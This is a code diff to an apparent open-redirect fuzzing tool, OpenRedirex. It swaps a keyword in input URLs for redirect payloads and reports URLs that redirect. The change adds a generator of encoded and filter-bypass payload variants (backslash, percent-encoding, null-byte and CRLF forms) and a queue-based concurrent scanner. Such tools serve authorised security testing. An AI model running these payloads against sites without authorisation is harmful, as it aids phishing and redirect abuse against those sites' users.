@@ -5,10 +5,9 @@ import aiohttp
 import argparse
 import sys
 import socket
-from aiohttp import ClientConnectorError, ClientOSError, ServerDisconnectedError, ServerTimeoutError, ServerConnectionError, TooManyRedirects
+from aiohttp import ClientError
 from tqdm import tqdm
-import concurrent.futures
-from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
+from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, quote
 from typing import List
 
 
@@ -60,19 +59,56 @@ redirect_payloads = [
 "////%5cexample.com",
 "/////example.com",
 "/////example.com/",
-"////\;@example.com",
+r"////\;@example.com",
 "////example.com/"
 ]
 
-async def load_payloads(payloads_file):
+def generate_payload_variants(payloads):
+    variants = []
+    seen = set()
+
+    def add_payload(payload):
+        if payload and payload not in seen:
+            seen.add(payload)
+            variants.append(payload)
+
+    for payload in payloads:
+        add_payload(payload)
+        add_payload(payload.replace("https://", "http://"))
+        add_payload(payload.replace("://", "//"))
+        add_payload(payload.replace("://", ":/"))
+        add_payload("//" + payload.lstrip("/"))
+        add_payload("///" + payload.lstrip("/"))
+        add_payload("////" + payload.lstrip("/"))
+        add_payload(payload.replace("/", "\\"))
+        add_payload(payload.replace("//", "\\\\"))
+        add_payload(quote(payload, safe=""))
+        add_payload(quote(payload, safe="/%"))
+        add_payload(quote(payload, safe="/:@%?=&"))
+        add_payload(payload.replace("?", "%3F").replace("#", "%23"))
+        add_payload(f"{payload}%00")
+        add_payload(f"{payload}%0d%0a")
+        add_payload(f"{payload}?")
+        add_payload(f"{payload}#")
+        add_payload(f"{payload}/")
+
+    return variants
+
+
+def load_payloads(payloads_file, generate_variants=False):
     if payloads_file:
         with open(payloads_file) as f:
-            return [line.strip() for line in f]
+            payloads = [line.strip() for line in f if line.strip()]
     else:
-        return redirect_payloads  # Return hardcoded list if no file specified
+        payloads = redirect_payloads  # Return hardcoded list if no file specified
+
+    if generate_variants:
+        return generate_payload_variants(payloads)
+
+    return payloads
 
 
-def fuzzify_url(url: str, keyword: str) -> str:
+def fuzzify_url(url: str, keyword: str = "FUZZ") -> str:
     # If the keyword is already in the url, return the url as is.
     if keyword in url:
         return url
@@ -90,11 +126,13 @@ def fuzzify_url(url: str, keyword: str) -> str:
     return fuzzed_url
 
 
-def load_urls() -> List[str]:
+def load_urls(keyword: str = "FUZZ") -> List[str]:
     urls = []
     for line in sys.stdin:
         url = line.strip()
-        fuzzed_url = fuzzify_url(url, "FUZZ")
+        if not url:
+            continue
+        fuzzed_url = fuzzify_url(url, keyword)
         urls.append(fuzzed_url)
     return urls
 
@@ -104,41 +142,70 @@ async def fetch_url(session, url):
     try:
         async with session.head(url, allow_redirects=True, timeout=10) as response:
             return response
-    except (ClientConnectorError, ClientOSError, ServerDisconnectedError, ServerTimeoutError, ServerConnectionError, TooManyRedirects, UnicodeDecodeError, socket.gaierror, asyncio.exceptions.TimeoutError):
+    except (ClientError, asyncio.exceptions.TimeoutError, socket.gaierror, UnicodeError, OSError):
         tqdm.write(f'[ERROR] Error fetching: {url}', file=sys.stderr)
         return None
 
-async def process_url(semaphore, session, url, payloads, keyword, pbar):
-    async with semaphore:
-        for payload in payloads:
-            filled_url = url.replace(keyword, payload)
-            response = await fetch_url(session, filled_url)
-            if response and response.history:
-                locations = " --> ".join(str(r.url) for r in response.history)
-                # If the string contains "-->", print in green
-                if "-->" in locations:
-                    tqdm.write(f'{DARK_GREEN}[FOUND]{ENDC} {LIGHT_GREEN}{filled_url} redirects to {locations}{ENDC}')
-                else:
-                    tqdm.write(f'[INFO] {filled_url} redirects to {locations}')
-            pbar.update()
+async def process_request(session, filled_url, pbar):
+    try:
+        response = await fetch_url(session, filled_url)
+        if response and response.history:
+            locations = " --> ".join(
+                [str(redirect.url) for redirect in response.history] + [str(response.url)]
+            )
+            # If the string contains "-->", print in green
+            if "-->" in locations:
+                tqdm.write(f'{DARK_GREEN}[FOUND]{ENDC} {LIGHT_GREEN}{filled_url} redirects to {locations}{ENDC}')
+            else:
+                tqdm.write(f'[INFO] {filled_url} redirects to {locations}')
+    finally:
+        pbar.update()
 
-async def process_urls(semaphore, session, urls, payloads, keyword):
-    with tqdm(total=len(urls) * len(payloads), ncols=70, desc='Processing', unit='url', position=0) as pbar:
-        tasks = []
+
+async def process_urls(concurrency, session, urls, payloads, keyword):
+    total_requests = len(urls) * len(payloads)
+    if total_requests == 0:
+        return
+
+    worker_count = min(concurrency, total_requests)
+    queue = asyncio.Queue(maxsize=worker_count * 2)
+
+    async def producer():
         for url in urls:
-            tasks.append(process_url(semaphore, session, url, payloads, keyword, pbar))
-        await asyncio.gather(*tasks, return_exceptions=True)
+            for payload in payloads:
+                filled_url = url.replace(keyword, payload)
+                await queue.put(filled_url)
+
+    async def worker():
+        while True:
+            filled_url = await queue.get()
+            try:
+                await process_request(session, filled_url, pbar)
+            finally:
+                queue.task_done()
+
+    with tqdm(total=total_requests, ncols=70, desc='Processing', unit='url', position=0) as pbar:
+        producer_task = asyncio.create_task(producer())
+        workers = [asyncio.create_task(worker()) for _ in range(worker_count)]
+        await producer_task
+        await queue.join()
+        for worker_task in workers:
+            worker_task.cancel()
+        await asyncio.gather(*workers, return_exceptions=True)
 
 async def main(args):
-    payloads = await load_payloads(args.payloads)
-    urls = load_urls()
+    payloads = load_payloads(args.payloads, args.variants)
+    if not payloads:
+        raise SystemExit('[ERROR] No payloads to process.')
+    urls = load_urls(args.keyword)
+    if not urls:
+        return
     tqdm.write(f'[INFO] Processing {len(urls)} URLs with {len(payloads)} payloads.')
     async with aiohttp.ClientSession() as session:
-        semaphore = asyncio.Semaphore(args.concurrency)
-        await process_urls(semaphore, session, urls, payloads, args.keyword)
+        await process_urls(args.concurrency, session, urls, payloads, args.keyword)
 
 if __name__ == "__main__":
-    banner = """
+    banner = r"""
    ____                   ____           ___               
   / __ \____  ___  ____  / __ \___  ____/ (_)_______  _  __
  / / / / __ \/ _ \/ __ \/ /_/ / _ \/ __  / / ___/ _ \| |/_/
@@ -152,7 +219,10 @@ if __name__ == "__main__":
     parser.add_argument('-p', '--payloads', help='file of payloads', required=False)
     parser.add_argument('-k', '--keyword', help='keyword in urls to replace with payload (default is FUZZ)', default="FUZZ")
     parser.add_argument('-c', '--concurrency', help='number of concurrent tasks (default is 100)', type=int, default=100)
+    parser.add_argument('-V', '--variants', help='generate encoded and bypass variants for each payload', action='store_true')
     args = parser.parse_args()
+    if args.concurrency < 1:
+        parser.error('--concurrency must be greater than 0')
     try:
         asyncio.run(main(args))
     except KeyboardInterrupt:
